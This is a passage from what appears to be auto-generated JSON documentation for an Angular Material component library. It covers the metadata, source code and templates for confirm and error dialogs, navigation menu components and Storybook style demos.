                        "type": "MatDialogRef<ConfirmComponent>"
                    }
                ],
                "line": 39,
                "jsdoctags": [
                    {
                        "name": "data",
                        "type": "Data",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "dialogRef",
                        "type": "MatDialogRef<ConfirmComponent>",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "readme": "<h4 id=\"stoconfirmdialog\">StoConfirmDialog</h4>\n<p> A confirm dialog that emits an observable.\n The ConfirmService is injected to a component and used from there.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-javascript\">class MyComp {\n  constructor(private confirmService: ConfirmService) {}\n  // component logic\n}</code></pre></div><p>Here the ConfirmService is injected to a component through the constructor.</p>\n<p>#####confirm\nThe confirm method takes three arguments, the message in the dialog, a title and the text for the confirm or &quot;OK&quot; utton. </p>\n<div><pre class=\"line-numbers\"><code class=\"language-javascript\"> this.confirmSvc.confirm(message, title, confirmText)\n      .subscribe(isConfirmed =&gt; {\n        if (isConfirmed) {\n            //Do stuff\n        }\n        else {\n          // Ignore\n        }\n      }); </code></pre></div>"
        },
        {
            "name": "ConfirmDemoComponent",
            "id": "component-ConfirmDemoComponent-879b81b31807f37706be673dad04c481",
            "file": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "app-confirm-demo",
            "styleUrls": [],
            "styles": [],
            "template": "<button (click)=\"show()\"\n        mat-button>Show confirm\n</button>\n",
            "templateUrl": [],
            "viewProviders": [],
            "inputsClass": [],
            "outputsClass": [],
            "propertiesClass": [],
            "methodsClass": [
                {
                    "name": "show",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 24
                }
            ],
            "hostBindings": [],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import { Meta, Story } from '@storybook/angular/types-6-0';\nimport { moduleMetadata } from '@storybook/angular';\nimport { MatButtonModule } from '@angular/material/button';\nimport { BrowserAnimationsModule } from '@angular/platform-browser/animations';\n// @ts-ignore\nimport { Component, NgModule } from '@angular/core';\nimport { MAT_DIALOG_DEFAULT_OPTIONS, MatDialogConfig } from '@angular/material/dialog';\nimport { ConfirmModule, ConfirmService } from '@ngx-stoui/common';\n\nconst dialogConfig = new MatDialogConfig();\ndialogConfig.width = '560px';\ndialogConfig.panelClass = 'sto-dialog';\n\n@Component({\n  selector: 'app-confirm-demo',\n  template: `\n    <button (click)=\"show()\"\n            mat-button>Show confirm\n    </button>\n  `,\n\n})\nclass ConfirmDemoComponent {\n  show() {\n    this.confirm.confirm('Confirmation message should be short', 'Confirm delete', 'Delete');\n  }\n\n  constructor(private confirm: ConfirmService) {\n  }\n}\n\n@NgModule({\n  declarations: [ConfirmDemoComponent],\n  exports: [ConfirmDemoComponent],\n})\nclass ConfirmerModule {}\n\nexport default {\n  title: 'common/Confirm Service',\n  decorators: [\n    moduleMetadata({\n      imports: [\n        ConfirmModule, ConfirmerModule, BrowserAnimationsModule, MatButtonModule ],\n      declarations: [  ],\n      providers: [ { provide: MAT_DIALOG_DEFAULT_OPTIONS, useValue: dialogConfig } ]\n    })\n  ],\n  parameters: {\n  },\n} as Meta;\n\n\nexport const Usage: Story<ConfirmDemoComponent> = (args: ConfirmDemoComponent) => {\n  return {\n    component: ConfirmDemoComponent,\n    props: args,\n    template: '<app-confirm-demo></app-confirm-demo>'\n  };\n};\n",
            "assetsDirs": [],
            "styleUrlsData": "",
            "stylesData": "",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "confirm",
                        "type": "ConfirmService"
                    }
                ],
                "line": 26,
                "jsdoctags": [
                    {
                        "name": "confirm",
                        "type": "ConfirmService",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            }
        },
        {
            "name": "DialogComponent",
            "id": "component-DialogComponent-211faee847498c65076ca67374646d2b",
            "file": "libs/error-handler/src/lib/error-handler/dialog/dialog.component.ts",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-dialog",
            "styleUrls": [
                "./dialog.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./dialog.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [],
            "outputsClass": [],
            "propertiesClass": [
                {
                    "name": "data",
                    "type": "HttpError",
                    "optional": false,
                    "description": "",
                    "line": 12,
                    "decorators": [
                        {
                            "name": "Inject",
                            "stringifiedArguments": "MAT_DIALOG_DATA"
                        }
                    ],
                    "modifierKind": [
                        114
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "handleEvent",
                    "args": [
                        {
                            "name": "action",
                            "type": " | unknown | undefined"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 16,
                    "jsdoctags": [
                        {
                            "name": "action",
                            "type": " | unknown | undefined",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "hostBindings": [],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import { Component, Inject } from '@angular/core';\nimport { MAT_DIALOG_DATA, MatDialogRef } from '@angular/material/dialog';\nimport { HttpError } from '../http-error';\n\n@Component({\n  selector: 'sto-dialog',\n  templateUrl: './dialog.component.html',\n  styleUrls: [ './dialog.component.scss' ]\n})\nexport class DialogComponent {\n\n  constructor(@Inject(MAT_DIALOG_DATA) public data: HttpError, private ref: MatDialogRef<DialogComponent>) {\n  }\n\n  // eslint-disable-next-line @typescript-eslint/no-explicit-any\n  handleEvent(action: ((...args: any[]) => unknown) | unknown | undefined) {\n    if ( typeof action === 'function' ) {\n      try {\n        action(this.data);\n      } catch ( ex ) {\n        console.warn('Failed to execute function.');\n        console.warn(ex);\n      }\n    }\n    this.ref.close(action || this.data);\n  }\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": "",
                    "styleUrl": "./dialog.component.scss"
                }
            ],
            "stylesData": "",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "data",
                        "type": "HttpError"
                    },
                    {
                        "name": "ref",
                        "type": "MatDialogRef<DialogComponent>"
                    }
                ],
                "line": 10,
                "jsdoctags": [
                    {
                        "name": "data",
                        "type": "HttpError",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "ref",
                        "type": "MatDialogRef<DialogComponent>",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "templateData": "<h3 style=\"font-weight: 500\"\n    mat-dialog-title>\n  {{ data.title }}\n</h3>\n<mat-dialog-content>\n  <p style=\"font-size: 16px; white-space: pre-line\">{{ data.text }}</p>\n</mat-dialog-content>\n<mat-dialog-actions style=\"justify-content: flex-end\">\n  <button color=\"primary\"\n          mat-button\n          *ngIf=\"!(data.actions || []).length\"\n          mat-dialog-close>OK\n  </button>\n  <button color=\"primary\"\n          mat-button\n          *ngFor=\"let a of data.actions\"\n          (click)=\"handleEvent(a.action || a.closeDialogData)\">\n    {{ a.label }}\n  </button>\n</mat-dialog-actions>\n"
        },
        {
            "name": "DialogDemoComponent",
            "id": "component-DialogDemoComponent-aa97a1df6b2b7021966082392b02f368",
            "file": "libs/core/src/lib/styles.stories.ts",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "app-dialog-demo",
            "styleUrls": [],
            "styles": [],
            "template": "  <button mat-button\n          (click)=\"show(tmpl)\">Show dialog\n  </button>\n  <ng-template #tmpl>\n    <h3 mat-dialog-title>Dialog Title</h3>\n    <mat-dialog-content [class.scroll-lines]=\"separatorLines\">\n      <ul style=\"padding-left: 12px\">\n        <li>Dialog actions should (nearly) always be text-buttons (never raised).</li>\n        <ul>\n          <li>Exception is e.g to confirm a deletion, in which case you can use \"mat-stroked-button\" with color=\"warn\"</li>\n        </ul>\n        <li>Dialog title should always be with an h3 element</li>\n        <li>Dialog textual content should always be done using paragraphs (&lt;p&gt;)</li>\n      </ul>\n      <p>Configuration:</p>\n      <code><pre>\n  const dialogConfig = new MatDialogConfig();\n  dialogConfig.width = '560px';\n  dialogConfig.panelClass = 'sto-dialog';\n  @NgModule(\n      ...,\n  providers: [\n        {{ '{' }}\n        provide: MAT_DIALOG_DEFAULT_OPTIONS,\n    useValue: dialogConfig\n        {{ '}' }}],\n  ...\n  )\n  export class AppModule...\n</pre>\n      </code>\n    </mat-dialog-content>\n    <mat-dialog-actions>\n      <button mat-button\n              mat-dialog-close>Cancel\n      </button>\n      <button mat-button\n              mat-dialog-close\n              color=\"primary\">Save\n      </button>\n    </mat-dialog-actions>\n  </ng-template>\n",
            "templateUrl": [],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "separatorLines",
                    "line": 61,
                    "type": "boolean"
                }
            ],
            "outputsClass": [],
            "propertiesClass": [],
            "methodsClass": [
                {
                    "name": "show",
                    "args": [
                        {
                            "name": "tmpl",
                            "type": "TemplateRef<unknown>"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 63,
                    "jsdoctags": [
                        {
                            "name": "tmpl",
                            "type": "TemplateRef<unknown>",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "hostBindings": [],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import { Meta, Story } from '@storybook/angular/types-6-0';\nimport { moduleMetadata } from '@storybook/angular';\nimport { MatCardModule } from '@angular/material/card';\nimport { MatDialog, MatDialogModule } from '@angular/material/dialog';\nimport { Component, Input, TemplateRef } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { BrowserAnimationsModule } from '@angular/platform-browser/animations';\nimport { MatButtonModule } from '@angular/material/button';\nimport { MatIconModule } from '@angular/material/icon';\nimport { MatTabsModule } from '@angular/material/tabs';\n\n@Component({\n  selector: 'app-dialog-demo',\n  template: `\n    <button mat-button\n            (click)=\"show(tmpl)\">Show dialog\n    </button>\n    <ng-template #tmpl>\n      <h3 mat-dialog-title>Dialog Title</h3>\n      <mat-dialog-content [class.scroll-lines]=\"separatorLines\">\n        <ul style=\"padding-left: 12px\">\n          <li>Dialog actions should (nearly) always be text-buttons (never raised).</li>\n          <ul>\n            <li>Exception is e.g to confirm a deletion, in which case you can use \"mat-stroked-button\" with color=\"warn\"</li>\n          </ul>\n          <li>Dialog title should always be with an h3 element</li>\n          <li>Dialog textual content should always be done using paragraphs (&lt;p&gt;)</li>\n        </ul>\n        <p>Configuration:</p>\n        <code><pre>\n    const dialogConfig = new MatDialogConfig();\n    dialogConfig.width = '560px';\n    dialogConfig.panelClass = 'sto-dialog';\n    @NgModule(\n        ...,\n    providers: [\n          {{ '{' }}\n          provide: MAT_DIALOG_DEFAULT_OPTIONS,\n      useValue: dialogConfig\n          {{ '}' }}],\n    ...\n    )\n    export class AppModule...\n  </pre>\n        </code>\n      </mat-dialog-content>\n      <mat-dialog-actions>\n        <button mat-button\n                mat-dialog-close>Cancel\n        </button>\n        <button mat-button\n                mat-dialog-close\n                color=\"primary\">Save\n        </button>\n      </mat-dialog-actions>\n    </ng-template>\n  `\n})\nclass DialogDemoComponent {\n  @Input()\n  separatorLines: boolean;\n\n  show(tmpl: TemplateRef<unknown>) {\n    this.dialog.open(tmpl, {\n      width: '560px',\n      panelClass: 'sto-dialog'\n    });\n  }\n\n  constructor(private dialog: MatDialog) {\n  }\n}\n\nexport default {\n  title: 'core/Styles',\n  decorators: [\n    moduleMetadata({\n      imports: [ MatCardModule, MatTabsModule, MatDialogModule, CommonModule, BrowserAnimationsModule, MatButtonModule, MatIconModule ],\n      declarations: [ DialogDemoComponent ]\n    })\n  ],\n  argTypes: {\n    template: { control: { disable: true } }\n  }\n} as Meta;\n\nexport const StoCard: Story<{ withStyles: boolean }> = (args) => ( {\n  props: { ...args },\n  template: `<mat-card [class.sto-card]=\"withStyles\">\n<mat-card-title [class.sto-card__title]=\"withStyles\">Card Title</mat-card-title>\n<mat-card-subtitle [class.sto-card__subtitle]=\"withStyles\">Card Subtitle</mat-card-subtitle>\n<mat-card-content [class.sto-card__content]=\"withStyles\">Card Content In Here</mat-card-content>\n</mat-card>`\n} );\nStoCard.args = {\n  withStyles: true\n};\n\nexport const StoGrid: Story<unknown> = () => ( {\n  template: `\n<div class=\"sto-grid sto-grid--2\" style=\"margin-bottom: 8px;\">\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--2</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--2</div>\n</div>\n<div class=\"sto-grid sto-grid--3\" style=\"margin-bottom: 8px;\">\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--3</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--3</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--3</div>\n</div>\n<div class=\"sto-grid sto-grid--4\" style=\"margin-bottom: 8px;\">\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--4</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--4</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--4</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--4</div>\n</div>\n<div class=\"sto-grid sto-grid--6\" style=\"margin-bottom: 8px;\">\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--6</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--6</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--6</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--6</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--6</div>\n  <div class=\"sto-grid__column\" style=\"border: 1px solid blue\">sto-grid--6</div>\n</div>\n  `,\n} );\n\nexport const StoDialog: Story<Record<string, unknown>> = (args) => ( {\n  props: { ...args },\n  template: `<app-dialog-demo [separatorLines]=\"separatorLines\"></app-dialog-demo>`,\n} );\nStoDialog.args = {\n  separatorLines: false\n};\n\nexport const StoTheme: Story<Record<string, unknown>> = args => ( {\n  props: { ...args, colors: [ 'primary', 'accent', 'warn', 'warning', 'success', 'danger' ] },\n  styles: [\n    `\n    .container { display: flex; }\n    .container > div {\n     flex: 0 1 auto;\n     padding-left: 16px;\n     }\n    `\n  ],\n  template: `\n  <mat-tab-group>\n  <mat-tab label=\"Buttons\">\n    <mat-card class=\"sto-card\">\n    <div *ngFor=\"let color of colors\">\n      <mat-card-subtitle class=\"sto-card__subtitle\">\n    <h2>{{ color }}</h2>\n</mat-card-subtitle>\n    <button mat-button [color]=\"color\">Mat Button</button>\n    <button mat-stroked-button [color]=\"color\">Mat stroked Button</button>\n    <button mat-flat-button [color]=\"color\">Mat flat Button</button>\n    <button mat-raised-button [color]=\"color\">Mat raised Button</button>\n    <button mat-icon-button [color]=\"color\"><mat-icon>home</mat-icon></button>\n</div>\n</mat-card>\n  </mat-tab>\n  <mat-tab label=\"Cards\">\n  <mat-card *ngFor=\"let c of colors\" [ngClass]=\"'mat-' + c\">\n  <mat-card-title>{{ c }}</mat-card-title>\n</mat-card>\n</mat-tab>\n<mat-tab label=\"Text\">\n<mat-card class=\"sto-card\">\n    <div class=\"container\">\n    <div>\n    <p *ngFor=\"let color of colors\" [ngClass]=\"'mat-' + color\">&lt;p&gt; {{ color }}</p>\n</div>\n<div>\n    <span *ngFor=\"let color of colors\" style=\"display: block\" [ngClass]=\"'mat-' + color\">\n    &lt;span&gt; {{ color }}\n</span>\n</div>\n<div>\n    <h2 *ngFor=\"let color of colors\" style=\"display: block\" [ngClass]=\"'mat-' + color\">\n    &lt;h[1|2|3|4|5]&gt; {{ color }}\n</h2>\n</div>\n</div>\n</mat-card>\n</mat-tab>\n</mat-tab-group>\n  `,\n} );\n/*StoTheme.argTypes = {\n  color: { control: { type: 'select', options: [ 'primary', 'accent', 'warn', 'warning', 'success', 'danger' ] }, defaultValue: 'primary' },\n};*/\n",
            "assetsDirs": [],
            "styleUrlsData": "",
            "stylesData": "",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "dialog",
                        "type": "MatDialog"
                    }
                ],
                "line": 68,
                "jsdoctags": [
                    {
                        "name": "dialog",
                        "type": "MatDialog",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            }
        },
        {
            "name": "NavigationMenuComponent",
            "id": "component-NavigationMenuComponent-908f0adf63faecbb95f14f7a3e9ce93f",
            "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/navigation-menu.component.ts",
            "encapsulation": [
                "ViewEncapsulation.None"
            ],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-navigation-menu",
            "styleUrls": [],
            "styles": [],
            "templateUrl": [
                "./navigation-menu.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "menu",
                    "line": 11,
                    "type": "Menu"
                }
            ],
            "outputsClass": [
                {
                    "name": "onCommand",
                    "defaultValue": "new EventEmitter<NavigateCommand>()",
                    "line": 13,
                    "type": "EventEmitter"
                }
            ],
            "propertiesClass": [],
            "methodsClass": [],
            "hostBindings": [],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import { Component, EventEmitter, Input, Output, ViewEncapsulation } from '@angular/core';\nimport { Menu, NavigateCommand } from './menu';\n\n@Component({\n  selector: 'sto-navigation-menu',\n  templateUrl: './navigation-menu.component.html',\n  encapsulation: ViewEncapsulation.None\n})\nexport class NavigationMenuComponent {\n\n  @Input() menu: Menu;\n  // eslint-disable-next-line @angular-eslint/no-output-on-prefix\n  @Output() onCommand = new EventEmitter<NavigateCommand>();\n\n}\n",
            "assetsDirs": [],
            "styleUrlsData": "",
            "stylesData": "",
            "templateData": "<ng-container *ngIf=\"menu\">\n\t<mat-list class=\"sto-navigation\">\n\t\t<ng-container *ngFor=\"let group of menu.groups;  let last = last\">\n\t\t\t<mat-divider *ngIf=\"group.hasDivider\" class=\"sto-navigation__divider\"></mat-divider>\n\t\t\t<ng-container >\n\t\t\t\t<mat-expansion-panel class=\"sto-navigation__dropdown\" *ngIf=\"group.icon;else normal\">\n\t\t\t\t\t<mat-expansion-panel-header class=\"sto-navigation__dropdown__header\" expandedHeight=\"48px\">\n\t\t\t\t\t\t<mat-panel-title  class=\"sto-navigation__dropdown__title\" >\n\t\t\t\t\t\t\t<span class=\"sto-navigation__prefix\" >\n\t\t\t\t\t\t\t\t<mat-icon *ngIf=\"group.svgIcon\" [svgIcon]=\"group.icon\"></mat-icon>\n\t\t\t\t\t\t\t\t<mat-icon *ngIf=\"!group.svgIcon\" matListIcon>{{group.icon}}</mat-icon>\n\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t {{group.name}}\n\t\t\t\t\t\t</mat-panel-title>\n\t\t\t\t\t</mat-expansion-panel-header>\n\t\t\t\t\t<ng-container *ngFor=\"let item of group.items\">\n\t\t\t\t\t\t<sto-navigation-menu-item [item]=\"item\" (onCommand)=\"onCommand.emit($event)\" ></sto-navigation-menu-item>\n\t\t\t\t\t</ng-container>\n\t\t\t\t</mat-expansion-panel>\n\t\t\t</ng-container>\n\t\t\t<ng-template #normal>\n\t\t\t\t<h3 *ngIf=\"group.name\" mat-subheader>{{group.name}}</h3>\n\t\t\t\t<ng-container *ngFor=\"let item of group.items\">\n\t\t\t\t\t<sto-navigation-menu-item [item]=\"item\" (onCommand)=\"onCommand.emit($event)\"></sto-navigation-menu-item>\n\t\t\t\t</ng-container>\n\n\t\t\t</ng-template>\n\n\n\n\t\t</ng-container>\n\t</mat-list>\n</ng-container>\n"
        },
        {
            "name": "NavigationMenuItemComponent",
            "id": "component-NavigationMenuItemComponent-2ec55aa8f5188ff1784defac0d1c8371",
            "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/navigation-menu-item/navigation-menu-item.component.ts",
            "encapsulation": [
                "ViewEncapsulation.None"
            ],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-navigation-menu-item",
            "styleUrls": [],
            "styles": [],
            "templateUrl": [
                "./navigation-menu-item.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "item",
                    "line": 12,
                    "type": "MenuItem"
                }
            ],
            "outputsClass": [
                {
                    "name": "onCommand",
                    "defaultValue": "new EventEmitter<NavigateCommand>()",
                    "line": 15,
                    "type": "EventEmitter"
                }
            ],
            "propertiesClass": [
                {
                    "name": "menuItemTypes",
                    "defaultValue": "MenuItemTypes",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 16,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "urlPrefix",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 17,
                    "modifierKind": [
                        114
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "navigate",
                    "args": [
                        {
                            "name": "$event",
                            "type": "KeyboardEvent | MouseEvent"
                        },
                        {
                            "name": "command",
                            "type": "any"
                        },
                        {
                            "name": "item",
                            "type": "literal type"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 24,
                    "modifierKind": [
                        114
                    ],
                    "jsdoctags": [
                        {
                            "name": "$event",
                            "type": "KeyboardEvent | MouseEvent",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "command",
                            "type": "any",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "item",
                            "type": "literal type",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "hostBindings": [],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import { Component, EventEmitter, Inject, Input, Optional, Output, ViewEncapsulation } from '@angular/core';\nimport { USE_HASH_ROUTING } from '../../tokens';\nimport { MenuItem, MenuItemTypes, NavigateCommand } from '../menu';\n\n@Component({\n  selector: 'sto-navigation-menu-item',\n  templateUrl: './navigation-menu-item.component.html',\n  styles: [],\n  encapsulation: ViewEncapsulation.None\n})\nexport class NavigationMenuItemComponent {\n  @Input() item: MenuItem;\n  // eslint-disable-next-line @angular-eslint/no-output-on-prefix\n  @Output()\n  onCommand = new EventEmitter<NavigateCommand>();\n  public menuItemTypes = MenuItemTypes;\n  public urlPrefix: string;\n\n  constructor(@Inject(USE_HASH_ROUTING) @Optional() useHash: boolean) {\n    this.urlPrefix = useHash === false ? '/' : '#/';\n  }\n\n  // eslint-disable-next-line @typescript-eslint/no-explicit-any\n  public navigate($event: KeyboardEvent | MouseEvent, command: any, item: { error?: string; }) {\n    if ( item.error ) {\n      return;\n    }\n    this.onCommand.emit({ $event, command });\n  }\n\n}\n",
            "assetsDirs": [],
            "styleUrlsData": "",
            "stylesData": "",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "useHash",
                        "type": "boolean"
                    }
                ],
                "line": 17,
                "jsdoctags": [
                    {
                        "name": "useHash",
                        "type": "boolean",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "templateData": "<mat-list-item class=\"sto-navigation__item\"\n               (click)=\"navigate($event, item.command, item)\">\n  <ng-container *ngIf=\"!item.error; else error\">\n    <button mat-button>\n      <mat-icon *ngIf=\"item.svgIcon && item.icon\"\n                matListIcon\n                [svgIcon]=\"item.icon\"></mat-icon>\n      <mat-icon *ngIf=\"!item.svgIcon\"\n                matListIcon>{{item.icon}}</mat-icon>\n      <span class=\"sto-navigation__item__text\">\n        <ng-container *ngIf=\"item.command && item.command.type === menuItemTypes.External\">\n          <a (click)=\"$event.preventDefault()\"\n             [href]=\"item.command.arguments[0]\">\n            {{item.name}}\n          </a>\n        </ng-container>\n        <ng-container *ngIf=\"item.command && item.command.type === menuItemTypes.ExternalNew\">\n          <a (click)=\"$event.preventDefault()\"\n             [href]=\"item.command.arguments[0]\">\n            {{item.name}}\n          </a>\n          <span class=\"sto-navigation__suffix\">\n            <mat-icon>open_in_new</mat-icon>\n          </span>\n        </ng-container>\n        <ng-container *ngIf=\"item.command && item.command.type === menuItemTypes.Internal\">\n          <a (click)=\"$event.preventDefault()\"\n             [href]=\"urlPrefix + item.command.arguments.join('/')\">\n            {{item.name}}\n          </a>\n        </ng-container>\n        <ng-container *ngIf=\"item.command && item.command.type !== menuItemTypes.External\n\t\t\t && item.command.type !== menuItemTypes.ExternalNew\n\t\t\t && item.command.type !== menuItemTypes.Internal\">\n          <span>\n            <span>{{item.name}}</span>\n            <span class=\"sto-navigation__suffix\"\n                  *ngIf=\"item.command.type === menuItemTypes.Navigate\">\n              <mat-icon>keyboard_arrow_right</mat-icon>\n            </span>\n          </span>\n        </ng-container>\n\n      </span>\n    </button>\n  </ng-container>\n  <ng-template #error>\n    <button mat-button\n            disabled=\"disabled\">\n      <mat-icon *ngIf=\"item.svgIcon && item.icon\"\n                matListIcon\n                [svgIcon]=\"item.icon\"></mat-icon>\n      <mat-icon *ngIf=\"!item.svgIcon\"\n                matListIcon>{{item.icon}}</mat-icon>\n      <span class=\"sto-navigation__item__text sto-navigation__item__text--error\">{{item.name}}</span>\n    </button>\n  </ng-template>\n</mat-list-item>\n"
        },
        {
            "name": "NavigationPartComponent",
            "id": "component-NavigationPartComponent-e0e4fe95462711b8a2f169b2814da526",
            "file": "libs/drawer/src/lib/sto-navigation/navigation-part/navigation-part.component.ts",
            "changeDetection": "ChangeDetectionStrategy.OnPush",
            "encapsulation": [
                "ViewEncapsulation.None"
            ],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-slide-panel",
            "styleUrls": [
                "./navigation-part.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./navigation-part.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "activePane",
                    "line": 21,
                    "type": "PaneType"
                }
            ],
            "outputsClass": [],
            "propertiesClass": [],
            "methodsClass": [],
            "hostBindings": [
                {
                    "name": "class.sto-slide-panel",
                    "defaultValue": "true",
                    "line": 23
                }
            ],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import { ChangeDetectionStrategy, Component, HostBinding, Input, ViewEncapsulation } from '@angular/core';\nimport { animate, state, style, transition, trigger } from '@angular/animations';\n\nexport type PaneType = 'left' | 'right';\n\n@Component({\n  selector: 'sto-slide-panel',\n  styleUrls: ['./navigation-part.component.scss'],\n  templateUrl: './navigation-part.component.html',\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  encapsulation: ViewEncapsulation.None,\n  animations: [\n    trigger('slide', [\n      state('left', style({transform: 'translateX(0)'})),\n      state('right', style({transform: 'translateX(-50%)'})),\n      transition('left <=> right', animate('300ms ease'))\n    ])\n  ]\n})\nexport class NavigationPartComponent {\n  @Input() activePane: PaneType;\n  @HostBinding('class.sto-slide-panel')\n  baseClass = true;\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": ":host {\n  display: block;\n  overflow: hidden;\n}\n\n.panes {\n  min-height: calc(100% - 40px);\n  width: 200%;\n\n  display: flex;\n  div {\n    flex: 1;\n  }\n}\n",
                    "styleUrl": "./navigation-part.component.scss"
                }
            ],
            "stylesData": "",
            "templateData": "<div class=\"panes\" [@slide]=\"activePane\">\n  <div><ng-content select=\"[leftPane]\"></ng-content></div>\n  <div><ng-content select=\"[rightPane]\"></ng-content></div>\n</div>\n"
        },
        {
            "name": "NextWrapperComponent",
            "id": "component-NextWrapperComponent-d6b390bd06c9afda3491a082f88bf21e",
            "file": "libs/error-handler/src/lib/wrapper.ts",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "next-wrapper",
            "styleUrls": [],
            "styles": [],
            "template": "<button mat-button\n        (click)=\"overRide(404)\">Overridden 404\n</button>\n<button mat-button\n        (click)=\"showError(s)\"\n        *ngFor=\"let s of errors\">{{s}} {{ s === 401 ? '(App Override)' : ''}}</button>\n",
            "templateUrl": [],
            "viewProviders": [],
            "inputsClass": [],
            "outputsClass": [],
            "propertiesClass": [
                {
                    "name": "errors",
                    "defaultValue": "[\n    0,\n    400,\n    401,\n    403,\n    404,\n    409,\n    500,\n    501,\n    503\n  ]",
                    "type": "[]",
                    "optional": false,
                    "description": "",
                    "line": 26,
                    "modifierKind": [
                        114
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "overRide",
                    "args": [
                        {
                            "name": "status",
                            "type": "number"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 53,
                    "jsdoctags": [
                        {
                            "name": "status",
                            "type": "number",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "showError",
                    "args": [
                        {
                            "name": "status",
                            "type": "number"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 41,
                    "jsdoctags": [
                        {
                            "name": "status",
                            "type": "number",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "hostBindings": [],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
